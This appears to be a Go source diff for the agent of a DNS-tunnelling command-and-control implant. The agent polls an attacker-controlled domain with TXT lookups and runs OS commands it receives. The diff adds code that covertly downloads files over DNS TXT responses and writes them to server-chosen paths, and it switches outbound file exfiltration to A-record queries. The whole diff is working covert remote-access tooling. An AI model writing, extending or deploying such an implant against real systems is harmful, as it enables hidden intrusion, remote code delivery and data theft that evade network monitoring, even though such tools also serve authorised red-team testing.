@@ -1,11 +1,14 @@
 package cmd
 
 import (
+	"crypto/sha1"
 	"encoding/hex"
 	"fmt"
+	"hash/crc32"
 	"io/ioutil"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 	"time"
 
@@ -48,11 +51,12 @@ Example:
 			// Wait for the next poll!
 			time.Sleep(time.Second * time.Duration(agentCmdAgentPoll))
 
-			pollDomain := fmt.Sprintf("%x.%s", agentCmdAgentName, options.Domain)
+			pollDomain := fmt.Sprintf("%x.%d.%s.%s", agentCmdAgentName, protocol.PollTypeCheckin, lib.RandomString(4), options.Domain)
 			log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")
 
 			// Do lookup
 			response := client.Lookup(pollDomain, dns.TypeTXT)
+			log.Debug().Str("payload", response.Data).Msg("TXT lookup response")
 
 			// Do nothing.
 			if strings.Contains(response.Data, protocol.NoCmdTxtResponse) {
@@ -102,6 +106,88 @@ Example:
 				log.Debug().Str("cmd", command).Msg("command is an os command")
 				go executeCommand(cmdBin, cmdArgs)
 				continue
+			}
+
+			// handle file upload
+			if strings.Contains(response.Data, protocol.UploadTxtResponse) {
+
+				log.Debug().Msg("receiving file")
+
+				// loop txt queries of type protocol.PollTypeUpload until we get an error to receive the file
+				var fileData []byte
+				for {
+					uploadPollDomain := fmt.Sprintf("%x.%d.%s.%s", agentCmdAgentName, protocol.PollTypeUpload, lib.RandomString(4), options.Domain)
+					log.Debug().Str("poll-domain", pollDomain).Msg("poll domain")
+
+					// Do lookup
+					response := client.Lookup(uploadPollDomain, dns.TypeTXT)
+					log.Debug().Str("payload", response.Data).Msg("TXT lookup response")
+
+					// server stopped?
+					if response.Data == "" {
+						break
+					}
+
+					// we're done, break
+					if !strings.Contains(response.Data, protocol.UploadTxtResponse) {
+						break
+					}
+
+					// v=B2B3FE1C,8dbc.1.defe2799.0.64.12cc5...
+					filePayload := strings.Split(response.Data, ",")
+					filePayload = strings.Split(filePayload[1], ".")
+
+					// ident.seq.crc32.proto.datalen.data
+
+					byteData, err := hex.DecodeString(filePayload[5])
+					if err != nil {
+						log.Err(err).Msg("failed to decode data payload from string")
+						break
+					}
+
+					byteLen, err := strconv.Atoi(filePayload[4])
+					if err != nil {
+						log.Err(err).Msg("failed to convert data length to int")
+						break
+					}
+
+					if len(byteData) != byteLen {
+						log.Error().Int("expected", byteLen).Int("real", len(byteData)).
+							Msg("expected and real data length does not match")
+						break
+					}
+
+					byteCrc := fmt.Sprintf("%02x", crc32.ChecksumIEEE(byteData))
+					if filePayload[2] != byteCrc {
+						log.Warn().Str("expected-crc", filePayload[2]).Str("calculated-crd", byteCrc).Msg("crc32 check failed")
+						break
+					}
+
+					fileData = append(fileData, byteData...)
+				}
+
+				// decode/decrypt
+				var realFileData protocol.File
+				lib.UngobUnpress(&realFileData, fileData)
+
+				// check shasum
+				h := sha1.New()
+				h.Write(*realFileData.Data)
+
+				realSha := hex.EncodeToString(h.Sum(nil))
+				if realFileData.Shasum != realSha {
+					log.Debug().Str("expected", realFileData.Shasum).Str("real", realSha).Msg("shasum of downloaded file does not match")
+				}
+
+				f, err := os.Create(realFileData.Destination)
+				if err != nil {
+					log.Err(err).Str("file", realFileData.Destination).Msg("failed to create file")
+					break
+				}
+				defer f.Close()
+				f.Write(*realFileData.Data)
+
+				log.Debug().Str("file", realFileData.Destination).Msg("wrote file to disk")
 			}
 		}
 	},
@@ -172,7 +258,7 @@ func downloadFile(fileName string) error {
 
 	message := protocol.File{}
 	message.Prepare(&fileBuffer, fileInfo)
-	requests, successFlag := message.GetRequests()
+	requests, successFlag := message.GetARequests()
 
 	client, err := options.GetDNSClient()
 	if err != nil {
